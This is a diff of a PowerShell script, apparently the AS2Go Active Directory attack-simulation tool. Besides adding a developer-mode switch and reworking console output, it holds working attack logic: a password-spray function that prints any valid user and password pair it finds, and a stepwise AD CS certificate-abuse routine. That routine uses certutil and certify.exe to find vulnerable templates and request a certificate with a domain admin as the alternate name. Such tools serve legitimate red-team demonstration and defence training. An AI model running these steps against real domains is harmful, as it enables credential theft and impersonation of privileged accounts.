@@ -67,6 +67,12 @@ https://herrHoZi.com
 #Requires -RunAsAdministrator
 
 
+
+Param (
+    [switch]$DeveloperMode
+)
+
+
 ################################################################################
 ######                                                                     #####
 ######                        Global Settings                              #####
@@ -75,7 +81,7 @@ https://herrHoZi.com
 
 #region Global Settings
 
-[bool]$showStep = $false # show the steps in an image
+[bool]$showStep = $true # show the steps in an image
 
 $lastupdate   = "2022-11-09"
 $version      = "2.5.7.0" 
@@ -308,7 +314,8 @@ Function Start-PasswordSprayAttack
            $Domain_check = New-Object System.DirectoryServices.DirectoryEntry("",$user,$Password)
            if ($Domain_check.name -ne $null)
               {
-              Write-Host "Bingo $specChar User:$User Password:$Password" -ForegroundColor Yellow
+              Write-Host "Bingo $specChar found User: " -NoNewline; Write-Host $User -ForegroundColor Yellow -NoNewline
+              Write-Host " with Password: " -NoNewline;Write-Host $Password -ForegroundColor Yellow
               }
          }
 
@@ -2047,6 +2054,19 @@ Write-Host "[$lastVictim]"         -ForegroundColor $global:FGCHighLight
 Write-Host "`n"
 #Update AS2Go.xml config file
 Set-KeyValue -key "LastStart" -NewValue $TimeStamp
+
+
+If ($DeveloperMode) {
+  
+    [bool]$showStep = $false
+    Write-Host ""
+    Write-Warning "    Running AS2Go in Developer Mode!"
+    Write-Host ""
+    Write-Log -Message "Running AS2Go inDeveloper Mode"
+  }
+
+
+
 Pause
 
 ################################################################################
@@ -2144,6 +2164,15 @@ $MyFGC = $global:FGCHighLight
 else {
 $MyInfo = "          Still using these three (3) user accounts                    "
 $MyFGC = "White"
+
+If ($DeveloperMode) {
+  
+    [bool]$showStep = $false
+    Write-Host ""
+    Write-Warning "    Running AS2Go in Developer Mode!`n"
+    Write-Log -Message "Running AS2Go inDeveloper Mode"
+  }
+
 }
 
 
@@ -2469,46 +2498,79 @@ Write-Host "____________________________________________________________________
 
 # http://attack.mitre.org/techniques/T1649/
 
-$question = "`nDo you want to run this step - Y or N? Default "
+$question = "`nDo you want to run this attack - Y or N? Default "
 $answer   = Get-Answer -question $question -defaultValue $No
 
 If ($answer -eq $yes)
 
 {
-write-log -Message "Start Attack Level - Steal or Forge Authentication Certificates"
 
+Clear-Host
+write-log -Message "Start Attack Level - Steal or Forge Authentication Certificates"
+# define parameter
 $CAtemplate = "AS2Go"
 $altname =    $domainadmin
 $pemFile =    ".\$altname.pem"   
 
-Write-Host "Step 1 - Get the Enterprise CA name" -ForegroundColor $global:FGCHighLight
+Write-Host "____________________________________________________________________`n" 
+Write-Host "      Step 1 - Get the Enterprise Certification Authority"
+Write-Host "____________________________________________________________________`n"     
+
+Write-Host "  NEXT STEP: " -NoNewline
+Write-Host "certutil`n" -ForegroundColor $global:FGCCommand
+
+
 #get the Enterprise CA name
 Invoke-Command -ScriptBlock {certutil}
 Write-Host ""
-$MyCAConfig = Invoke-Command -ScriptBlock {certutil}
-$temp = $MyCAConfig[7].Split([char]0x0060).Split([char]0x0027)
-$myEntCA = $temp[1]
-Write-Host $myEntCA -ForegroundColor $global:FGCHighLight
-pause
-clear
 
-Write-Host "Step 2 - Finding Vulnerable Certificate Templates " -ForegroundColor $global:FGCHighLight -NoNewline
-Write-host "- certify.exe find /vulnerable" -ForegroundColor $global:FGCCommand
+$MyCAConfig = Invoke-Command -ScriptBlock {certutil}
+$temp       = $MyCAConfig[7].Split([char]0x0060).Split([char]0x0027)
+$myEntCA    = $temp[1]
+Write-Host "Found & use Enterprise Certification Authority: $myEntCA`n" -ForegroundColor $global:FGCHighLight
 pause
+
+
+Clear-Host
+Write-Host "____________________________________________________________________`n" 
+Write-Host "      Step 2 - Finding an Vulnerable Certificate Templates "
+Write-Host "____________________________________________________________________`n"
+
+Write-Host "  NEXT STEP: " -NoNewline
+Write-Host ".\certify.exe find /vulnerable`n" -ForegroundColor $global:FGCCommand
+pause
+
 #find vulnerable CA templates
 Invoke-Command -ScriptBlock {.\certify.exe find /vulnerable}
 
 Write-Host "`nFound Vulnerable Certificate Templates - $CAtemplate" -ForegroundColor Yellow
-Write-host "Do you want to use this CA template?" -ForegroundColor $global:FGCCommand
-pause 
-#get the Enterprise CA name
-$result = certutil -config $myEntCA -ping
+#Write-host "Do you want to use this CA template?" -ForegroundColor $global:FGCCommand
+Do
+{
+$question = "`nDo you want to use CA template '$CAtemplate' - Y or N? Default "
+$prompt   = Get-Answer -question $question -defaultValue $yes
 
+if ($prompt -ne $yes) 
+   {
+   $CAtemplate = Read-Host "Type in your preferred CA Template"
+   }
+  
+} Until ($prompt -eq $yes)
+
+
+#Check connectio to Enterprise CA
+$result = certutil -config $myEntCA -ping
 $text = "copy the certificate content printed out by certify and paste it into this file"
 
+Clear-Host
+Write-Host "____________________________________________________________________`n" 
+Write-Host "      Step 3 - Requesting Certificate with Certify                           "
+Write-Host "____________________________________________________________________`n"
 
-Write-Host "Step 2 - Requesting Certificate with Certify" -ForegroundColor $global:FGCHighLight
-Write-host "Do you want to use this CA template - $CAtemplate " -ForegroundColor Yellow
+Write-Host "  NEXT STEP: " -NoNewline
+Write-Host ".\certify.exe request /ca:$myEntCA /template:$CAtemplate /altname:$altname`n" -ForegroundColor $global:FGCCommand
+
+#Write-host "Do you want to use this CA template - $CAtemplate " -ForegroundColor Yellow
 
 pause
 
